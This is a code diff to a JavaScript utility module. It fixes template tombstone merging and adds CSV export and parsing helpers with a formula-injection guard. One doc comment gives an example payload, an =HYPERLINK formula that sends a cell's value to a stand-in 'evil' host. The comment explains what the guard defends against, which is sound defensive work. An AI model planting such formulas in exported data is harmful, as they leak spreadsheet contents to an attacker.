@@ -351,7 +351,16 @@ export function mergeTemplatesWithTombstones({ localTemplates = [], localDeleted
     const prev = tomb.get(d.id);
     if (!prev || (d.deletedAt || 0) > (prev.deletedAt || 0)) tomb.set(d.id, { id: d.id, name: d.name, deletedAt: d.deletedAt || 0 });
   }
-  const deleted = [...tomb.values()].filter((d) => (now && ttlMs !== Infinity) ? (now - (d.deletedAt || 0)) <= ttlMs : true);
+  // A template the user chose to KEEP after another device deleted it carries `revivedAt`; a tombstone OLDER than that
+  // no longer applies, and is dropped so it stops travelling. Without it "Keep them" never reached the deleting
+  // device - which re-merged its own tombstone, re-pushed it, and re-prompted the keeper on every sync (audit 2026-09-23).
+  const revived = new Map();
+  for (const t of [...arr(localTemplates), ...arr(remoteTemplates)]) {
+    if (t && t.id != null && t.revivedAt) revived.set(t.id, Math.max(revived.get(t.id) || 0, t.revivedAt));
+  }
+  const deleted = [...tomb.values()]
+    .filter((d) => (now && ttlMs !== Infinity) ? (now - (d.deletedAt || 0)) <= ttlMs : true)
+    .filter((d) => !(revived.get(d.id) >= (d.deletedAt || 0)));
   const deletedIds = new Set(deleted.map((d) => d.id));
   const localDeletedIds = new Set(arr(localDeleted).map((d) => d && d.id));
 
@@ -400,11 +409,62 @@ export function toMarkdownTable(headers, rows = [], title = '') {
   if (!cols.length) return '';
   const cell = (v) => {
     if (typeof v === 'boolean') return v ? '✓' : '';
-    return String(v ?? '').replace(/\|/g, '\\|').replace(/\r?\n/g, '<br>').trim();
+    return String(v ?? '').replace(/\|/g, '\\|').replace(/\r\n|\r|\n/g, '<br>').trim();
   };
   const head = `| ${cols.map(cell).join(' | ')} |`;
   const sep = `| ${cols.map(() => '---').join(' | ')} |`;
   const body = (Array.isArray(rows) ? rows : []).map((r) => `| ${(Array.isArray(r) ? r : []).map(cell).join(' | ')} |`);
   const table = [head, sep, ...body].join('\n');
   return title ? `### ${cell(title)}\n\n${table}` : table;
+}
+
+
+// ── CSV (audit 2026-09-23) ──────────────────────────────────────────────────────────────────────────────────────
+/** One CSV cell: RFC 4180 quoting (comma / quote / newline) plus a FORMULA GUARD. A cell a spreadsheet would run as a
+ *  formula (it starts with = + - @, tab or CR) is prefixed with an apostrophe, so an object name like
+ *  =HYPERLINK("https://evil/?d="&A2) from a shared diagram opens as text. Plain numbers ("-5", "+1.5") are left alone. */
+export function csvCell(v) {
+  let s = String(v ?? '').trim();
+  if (/^[=+\-@\t\r]/.test(s) && !/^[+-]?\d+(\.\d+)?$/.test(s)) s = `'${s}`;
+  return /[",\r\n]/.test(s) ? `"${s.replace(/"/g, '""')}"` : s;
+}
+
+/** Undo csvCell's formula guard on the way back in, so an exported file re-imports to the same values. */
+export function unguardCsvCell(s) {
+  return /^'[=+\-@]/.test(s) ? s.slice(1) : s;
+}
+
+/** The delimiter of a pasted block, read from its FIRST line outside quotes: tab when tabs outnumber commas there.
+ *  (Deciding on "any tab anywhere" switched a comma file to TSV the moment one value held a tab.) */
+export function sniffDelimiter(text) {
+  const first = String(text || '').split(/\r?\n/).find((l) => l.trim()) || '';
+  let tabs = 0, commas = 0, inQ = false;
+  for (const ch of first) {
+    if (ch === '"') inQ = !inQ;
+    else if (!inQ && ch === '\t') tabs++;
+    else if (!inQ && ch === ',') commas++;
+  }
+  return tabs > commas ? '\t' : ',';
+}
+
+/** Parse delimited text (RFC 4180): quoted cells may hold the delimiter, doubled quotes and newlines; CRLF or LF rows;
+ *  a leading BOM is dropped. Returns rows of raw cell strings; wholly blank rows are skipped. */
+export function parseDelimited(text, delim = ',') {
+  const src = String(text || '').replace(/^\uFEFF/, '');
+  const rows = [];
+  let row = [], cell = '', inQ = false;
+  const endRow = () => { row.push(cell); if (row.some((c) => c.trim() !== '')) rows.push(row); row = []; cell = ''; };
+  for (let i = 0; i < src.length; i++) {
+    const ch = src[i];
+    if (inQ) {
+      if (ch === '"') { if (src[i + 1] === '"') { cell += '"'; i++; } else inQ = false; }
+      else cell += ch;
+    } else if (ch === '"' && cell.trim() === '') { cell = ''; inQ = true; }
+    else if (ch === delim) { row.push(cell); cell = ''; }
+    else if (ch === '\r') { if (src[i + 1] === '\n') i++; endRow(); }
+    else if (ch === '\n') endRow();
+    else cell += ch;
+  }
+  if (cell !== '' || row.length) endRow();
+  return rows;
 }
